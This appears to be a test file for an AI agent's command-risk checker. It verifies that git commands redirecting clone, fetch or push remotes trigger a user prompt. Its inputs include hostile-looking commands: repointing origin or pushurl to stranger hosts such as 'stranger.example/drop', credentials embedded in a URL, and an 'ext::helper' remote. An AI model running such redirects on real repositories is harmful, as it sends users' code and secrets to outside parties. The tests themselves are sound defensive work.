import { execFileSync } from 'node:child_process';
import { mkdtemp, mkdir, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, expect, it } from 'vitest';
import { knownRemotes } from './git-remotes';
import { assessRisk, riskAsks } from './risk';

const homes: string[] = [];
const url = 'https://github.com/ada/shop.git';
async function repo() {
  const home = await mkdtemp(join(tmpdir(), 'conch-remote-'));
  homes.push(home);
  const git = (...args: string[]) =>
    execFileSync('git', ['-C', home, ...args], { stdio: 'ignore' });
  git('init', '-q');
  git('remote', 'add', 'origin', url);
  return { home, git };
}
afterEach(async () => {
  for (const home of homes.splice(0)) await rm(home, { recursive: true, force: true });
});

it('allows the reported local-clone setup only when it preserves the source destination', async () => {
  const { home } = await repo();
  const dest = join(home, 'copy');
  const command = `git clone --shared ${home} ${dest} && git -C ${dest} remote set-url origin ${url} && git -C ${dest} fetch origin main && git -C ${dest} merge --ff-only origin/main`;
  const sameRemote = await knownRemotes(command, home);
  expect(sameRemote?.(dest, 'origin', url)).toBe(true);
  for (const untrusted of [false, true])
    expect(
      riskAsks(assessRisk('Bash', { command }, { workspace: home, sameRemote }), untrusted),
    ).toBe(false);
  const evil = command.replace(url, 'https://github.com/stranger/drop.git');
  expect(
    riskAsks(
      assessRisk(
        'Bash',
        { command: evil },
        {
          workspace: home,
          sameRemote: await knownRemotes(evil, home),
          said: ['Fix and push'],
        },
      ),
      true,
    ),
  ).toBe(true);
  await mkdir(dest);
  expect((await knownRemotes(command, home))?.(dest, 'origin', url)).toBe(false);
});

it('reads fresh fetch and push destinations and does not confuse owners on the same host', async () => {
  const { home, git } = await repo();
  const command = `git remote set-url origin ${url}`;
  expect((await knownRemotes(command, home))?.(undefined, 'origin', url)).toBe(true);
  git('remote', 'set-url', '--push', 'origin', 'https://github.com/other/project.git');
  expect((await knownRemotes(command, home))?.(undefined, 'origin', url)).toBe(false);
  git('remote', 'set-url', 'origin', 'https://github.com/other/project.git');
  expect((await knownRemotes(command, home))?.(undefined, 'origin', url)).toBe(false);
});

it('does not infer evidence through shell substitutions, config overrides, helpers or directory changes', async () => {
  const { home } = await repo();
  for (const command of [
    `cd ${home} && git remote set-url origin ${url}`,
    `git -c remote.origin.url=${url} remote set-url origin ${url}`,
    `git config remote.origin.pushurl https://stranger.example/drop && git remote set-url origin ${url}`,
    `git remote set-url origin ${url}; echo done`,
    'git remote set-url origin https://user:secret@github.com/ada/shop.git',
    'git remote set-url origin ext::helper',
    `git remote set-url --add origin ${url}`,
  ]) {
    const sameRemote = await knownRemotes(command, home);
    expect(
      riskAsks(assessRisk('Bash', { command }, { workspace: home, sameRemote }), true),
      command,
    ).toBe(true);
  }
});
